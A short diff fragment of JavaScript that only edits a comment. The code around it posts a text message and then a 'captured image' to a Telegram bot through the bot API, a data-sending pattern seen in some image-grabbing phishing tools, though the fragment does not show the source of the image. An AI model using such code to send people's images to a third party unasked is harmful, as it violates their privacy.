@@ -250,7 +250,7 @@
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
-            // Send the captured image to Telegram bot.
+            // Send the captured image to Telegram bot
             if (imageData) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
